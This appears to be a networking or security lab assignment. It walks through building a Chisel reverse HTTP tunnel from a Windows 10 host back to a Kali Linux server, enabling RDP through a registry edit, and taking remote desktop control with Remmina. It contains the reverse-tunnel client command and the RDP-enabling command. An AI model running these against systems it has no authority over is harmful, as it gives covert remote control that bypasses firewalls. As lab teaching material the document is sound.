# Assignment 05: Setting up HTTP Tunneling via Port 80

## Conceptual Overview

### Q: What is HTTP?

HTTP (Hypertext Transfer Protocol) is an application-layer protocol that uses default port 80. It is primarily used for transmitting hypermedia documents (such as HTML, images, and API payloads) across the internet. It serves as the foundational communication protocol of the World Wide Web, operating on a client-server architecture over TCP/IP.

### Q: What is HTTP Tunneling?

HTTP tunneling creates a network link through a restricted environment (like a firewall or proxy) by wrapping non-HTTP protocols (such as SSH, RMI, or standard TCP) inside standard HTTP requests.

---

## Part 1: Download & Setup Chisel (Kali Linux & Windows 10)

### 1. Download Chisel on Kali Linux

1. Open **Firefox** and search for **Chisel GitHub**.
2. Navigate to **Releases** $\rightarrow$ **v1.11.8 (Latest)**.
3. Locate and download the release package: `chisel_1.11.8_linux_amd64.deb`.
4. Go to the `Downloads` directory, extract the downloaded package, right-click inside the extracted folder, and select **Open Terminal Here**.

### 2. Download Chisel on Windows 10

1. Open **Chrome** and navigate to **Chisel GitHub** $\rightarrow$ **Releases** $\rightarrow$ **v1.11.8 (Latest)**.
2. Download the archive: `chisel_1.11.8_windows_amd64.zip`.
3. Go to `Downloads` and extract the ZIP file.
4. Open the extracted Chisel folder, click on the File Explorer path/search bar, type `powershell`, and press `Enter` to launch PowerShell directly in that path.

---

## Part 2: Establish the Chisel Reverse Tunnel

### Step 1: Start Chisel Server on Kali Linux

In your Kali Linux terminal, run:

```bash
chisel server -p 9090 --reverse

```

*(Leave this terminal window open to keep the server active)*.

### Step 2: Connect Chisel Client from Windows PowerShell

In the Windows PowerShell terminal, establish the reverse RDP tunnel back to Kali:

```powershell
.\chisel.exe client <Kali_IP>:9090 R:3389:127.0.0.1:3389

```

* **Output:** `Listening...`
* **Mechanism:** This command routes local Windows RDP traffic (port 3389) back through the Chisel reverse tunnel to Kali's port 3389.

---

## Part 3: Verify the Tunnel & Check Windows RDP Status

### Step 1: Verify Active Port Listening on Kali Linux

Open a **new tab** in the Kali Linux terminal and execute:

```bash
ss -ltnp | grep 3389

```

> If port 3389 shows active listening, the reverse tunnel has been successfully created.

### Step 2: Test Local TCP Connection on Windows

In Windows PowerShell, test connectivity to the local port:

```powershell
Test-NetConnection localhost -Port 3389

```

> Expected Output: `TcpTestSucceeded : True`

### Step 3: Check and Enable Windows RDP Status

To verify if Remote Desktop Access is enabled in the Windows Registry (Run PowerShell as Administrator):

```powershell
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections

```

* **Registry Values:** `0` = RDP Enabled | `1` = RDP Disabled

If RDP is currently disabled (`1`), enable it with:

```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0

```

---

## Part 4: Remmina Installation & Remote Connection Setup

### 1. Remmina Installation on Kali Linux

If Remmina is not pre-installed or needs a specific version build, type `remmina` in the terminal. If missing, perform the manual installation:

```bash
# Update repository packages
sudo apt update

# Verify system CPU architecture
dpkg --print-architecture
# Output: amd64

# Create directory for package storage
mkdir -p ~/remmina-install
cd ~/remmina-install

# Download required packages
wget https://deb.debian.org/debian/pool/main/r/remmina/remmina-common_1.4.39+dfsg-1+deb13u1_all.deb
wget https://deb.debian.org/debian/pool/main/r/remmina/remmina_1.4.39+dfsg-1+deb13u1_amd64.deb
wget https://deb.debian.org/debian/pool/main/r/remmina/remmina-plugin-rdp_1.4.39+dfsg-1+deb13u1_amd64.deb

# Verify downloaded files
ls -lh

# Install all packages simultaneously
sudo apt install ./remmina-common_1.4.39+dfsg-1+deb13u1_all.deb \
                 ./remmina_1.4.39+dfsg-1+deb13u1_amd64.deb \
                 ./remmina-plugin-rdp_1.4.39+dfsg-1+deb13u1_amd64.deb -y

# Verify installation version
remmina --version

```

### 2. Connect to Windows RDP via Remmina

1. Open **Remmina** on Kali Linux.
2. Click the **`+` (New Connection Profile)** icon.
3. Configure the profile details:
* **Protocol:** `RDP`
* **Server:** `127.0.0.1:3389`
* **Username:** `<Windows_Username>`
* **Password:** `<Windows_User_Password>`


4. Click **Connect**.

> Successful completion grants full remote desktop graphical control of the target Windows host over the reverse tunneled connection.
